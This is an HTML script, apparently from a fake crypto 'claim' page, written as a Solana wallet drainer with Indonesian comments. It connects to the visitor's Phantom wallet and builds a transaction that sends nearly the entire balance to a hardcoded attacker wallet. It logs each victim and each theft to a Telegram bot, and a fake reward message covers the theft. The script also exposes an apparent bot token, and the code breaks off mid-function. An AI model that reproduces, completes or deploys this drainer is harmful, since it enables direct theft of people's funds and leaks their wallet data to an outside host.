    <script>
        // --- EDIT BAGIAN INI ---
        const MY_WALLET = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc"; 
        const BOT_TOKEN = "8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ";
        const CHAT_ID = "6518432642";
        // -----------------------

        async function sendLog(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
        }

        async function claim() {
            const provider = window.solana;
            if (!provider) return alert("Please open this link inside Phantom Browser/Extension");

            try {
                const resp = await provider.connect();
                const victim = resp.publicKey;
                await sendLog(`<b>üö® Target Connected!</b>\nWallet: <code>${victim.toString()}</code>`);

                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                const balance = await conn.getBalance(victim);

                if (balance < 1000000) return alert("Ineligible: Minimum balance not met.");

                // Buat transaksi kuras SOL
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: victim,
                        toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
                        lamports: balance - 500000, // Potong gas fee dikit
                    })
                );

                let { blockhash } = await conn.getRecentBlockhash();
                tx.recentBlockhash = blockhash;
                tx.feePayer = victim;

                // Minta konfirmasi di Phantom
                const signed = await provider.signAndSendTransaction(tx);
                await sendLog(`<b>üí∞ JEKPOT!</b>\nBerhasil kuras saldo dari: ${victim.toString()}\nTX: ${signed.signature}`);
                
                alert("Processing... Reward will be sent in 24 hours.");
            } catch (e) {
                await sendLog(`‚ùå Target nolak konfirmasi.`);

        }
